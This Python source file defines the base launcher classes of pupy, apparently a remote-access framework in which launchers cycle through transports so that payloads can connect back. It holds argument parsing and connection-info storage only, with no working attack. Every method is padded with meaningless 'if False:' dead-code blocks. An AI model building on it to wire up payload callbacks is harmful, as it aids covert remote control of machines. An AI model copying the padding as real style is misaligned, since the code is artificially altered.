"""
launchers bring an abstraction layer over transports to allow pupy payloads to try multiple transports until one succeed or perform custom actions on their own.
"""
__all__ = ('LauncherError', 'LauncherArgumentParser', 'BaseLauncher')
import argparse

class LauncherError(Exception):
    __slots__ = ()

class LauncherArgumentParser(argparse.ArgumentParser):
    __slots__ = ()

    def __init__(self, *args, **kwargs):
        if False:
            return 10
        argparse.ArgumentParser.__init__(self, *args, **kwargs)

    def exit(self, status=0, message=None):
        if False:
            i = 10
            return i + 15
        raise LauncherError(message)

    def error(self, message):
        if False:
            for i in range(10):
                print('nop')
        self.exit(2, str('%s: error: %s\n') % (self.prog, message))

class BaseLauncherMetaclass(type):

    def __init__(self, *args, **kwargs):
        if False:
            for i in range(10):
                print('nop')
        super(BaseLauncherMetaclass, self).__init__(*args, **kwargs)
        self.init_argparse()

class BaseLauncher(object):
    arg_parser = None
    args = None
    name = None
    __slots__ = ('args', 'host', 'hostname', 'port', '_transport', 'proxies', '_default_transport')
    __metaclass__ = BaseLauncherMetaclass

    def __init__(self):
        if False:
            while True:
                i = 10
        self.args = None
        self.reset_connection_info()
        self._default_transport = None

    def iterate(self):
        if False:
            return 10
        ' iterate must be an iterator returning rpyc stream instances '
        raise NotImplementedError("iterate launcher's method needs to be implemented")

    @classmethod
    def init_argparse(cls):
        if False:
            return 10
        cls.arg_parser = LauncherArgumentParser(prog=cls.__name__, description=cls.__doc__)

    def parse_args(self, args):
        if False:
            for i in range(10):
                print('nop')
        if not self.args:
            self.args = self.arg_parser.parse_args(args)
        if hasattr(self.args, 'transport'):
            self.set_default_transport(self.args.transport)

    def set_default_transport(self, transport):
        if False:
            print('Hello World!')
        self._default_transport = transport

    @property
    def transport(self):
        if False:
            for i in range(10):
                print('nop')
        return self._transport or self._default_transport

    def set_connection_info(self, hostname, host, port, proxies, transport=None):
        if False:
            return 10
        self.hostname = hostname
        self.host = host
        self.port = port
        self.proxies = proxies
        self._transport = transport

    def reset_connection_info(self):
        if False:
            return 10
        self.hostname = None
        self.host = None
        self.port = None
        self.proxies = None
        self._transport = None